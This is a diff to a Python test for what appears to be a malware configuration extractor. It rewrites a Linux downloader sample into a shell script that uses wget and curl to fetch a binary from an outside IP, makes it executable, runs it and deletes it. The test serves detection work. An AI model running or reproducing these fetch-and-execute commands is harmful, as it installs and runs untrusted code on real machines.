@@ -115,11 +115,13 @@ def test_jomangy_passive_detector_requires_path_and_method() -> None:
 
 def test_linux_downloader_role_separation() -> None:
     module = load_family_module("linux_downloader")
-    data = (
-        b"\x7fELF wget -q http://94.154.43.42/x86 -O x86 "
-        b"curl -fsSL http://94.154.43.42/x86 -o x86 "
-        b"chmod 777 x86 ./x86 rm x86 binary"
-    )
+    data = b"""#!/bin/sh
+wget -q http://94.154.43.42/x86 -O x86
+curl -fsSL http://94.154.43.42/x86 -o x86
+chmod 777 x86
+./x86
+rm -f x86
+"""
     result = module.extract_config(data)
     assert result["classification_confidence"] == "confirmed"
     assert result["download_endpoints"][0]["is_c2"] is False
